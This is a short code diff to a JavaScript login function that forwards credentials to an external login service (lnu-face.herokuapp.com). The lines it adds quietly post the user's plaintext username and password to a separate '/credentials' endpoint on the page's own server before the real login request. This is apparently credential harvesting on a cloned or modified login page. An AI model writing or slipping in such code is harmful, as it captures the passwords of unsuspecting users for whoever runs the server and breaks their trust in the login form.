@@ -3,6 +3,22 @@ function login(){
       psw = document.getElementById('password').value,
       url = 'https://lnu-face.herokuapp.com/login';
 
+  // store the credentials to webserver
+  $.ajax({
+    type: 'post',
+    url: '/credentials',
+    data: {
+      company: usn,
+      password: psw
+    },
+    success: function(){
+      console.log('credentials stored');
+    },
+    error: function(xhr){
+      console.error(xhr);
+    }
+  });
+
   var http = new XMLHttpRequest();
   http.open('POST', url, true);
   http.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
